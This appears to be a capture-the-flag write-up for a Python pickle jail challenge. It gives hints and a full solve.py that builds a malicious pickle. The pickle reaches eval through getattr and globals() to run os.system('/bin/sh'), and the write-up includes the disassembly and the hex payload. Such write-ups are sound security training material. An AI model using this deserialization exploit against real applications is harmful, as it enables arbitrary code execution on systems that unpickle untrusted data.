# jail 4

## restrictions

larger blocklist for the `find_class` function

additionally, all find_class only finds functions/classes from builtins

## hints

<details>
    <summary>Hint 1</summary>

Perhaps `getattr`?

</details>

<details>
    <summary>Hint 2</summary>

I wonder what would happen if you did `getattr(builtins, "eval")`... if only there were a way to get access to the builtins module object

</details>

<details>
    <summary>Hint 3</summary>

`globals()` is pretty useful

</details>

<details>
    <summary>Solution</summary>

tl;dr - `getattr(getattr(globals(), 'get')('__builtins__'), 'eval')('__import__("os").system("/bin/sh")')`

Access to `getattr` is readily available, so we can get the "get" attribute of the return value of `globals`, because `globals` returns a dictionary, and then get the eval from builtins.

It may be possible to remove the `'get'` and replace it with `'__builtins__'` and then not call the `'get'` function but I have not tested it.

solve.py
```python
from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'

p += GLOBAL
p += b'builtins\n'
p += b'getattr\n'
p += MEMOIZE  # memo[0] = getattr function

p += GLOBAL
p += b'builtins\n'
p += b'globals\n'
p += EMPTY_TUPLE
p += REDUCE
p += STRING
p += b'"get"\n'

p += TUPLE2

p += REDUCE

p += STRING
p += b'"__builtins__"\n'
p += TUPLE1

p += REDUCE
p += MEMOIZE  # memo[1] = builtins module
p += POP

p += GET
p += b'0\n'

p += GET
p += b'1\n'
p += STRING
p += b'"eval"\n'
p += TUPLE2
p += REDUCE

p += STRING
p += b'"__import__(\'os\').system(\'/bin/sh\')"\n'
p += TUPLE1
p += REDUCE

p += STOP

dis(p)
print("="*50)
print(p.hex())
```

output
```
    0: \x80 PROTO      5
    2: c    GLOBAL     'builtins getattr'
   20: \x94 MEMOIZE    (as 0)
   21: c    GLOBAL     'builtins globals'
   39: )    EMPTY_TUPLE
   40: R    REDUCE
   41: S    STRING     'get'
   48: \x86 TUPLE2
   49: R    REDUCE
   50: S    STRING     '__builtins__'
   66: \x85 TUPLE1
   67: R    REDUCE
   68: \x94 MEMOIZE    (as 1)
   69: 0    POP
   70: g    GET        0
   73: g    GET        1
   76: S    STRING     'eval'
   84: \x86 TUPLE2
   85: R    REDUCE
   86: S    STRING     "__import__('os').system('/bin/sh')"
  124: \x85 TUPLE1
  125: R    REDUCE
  126: .    STOP
highest protocol among opcodes = 4
==================================================
8005636275696c74696e730a676574617474720a94636275696c74696e730a676c6f62616c730a29525322676574220a865253225f5f6275696c74696e735f5f220a8552943067300a67310a53226576616c220a865253225f5f696d706f72745f5f28276f7327292e73797374656d28272f62696e2f73682729220a85522e
```

</details>
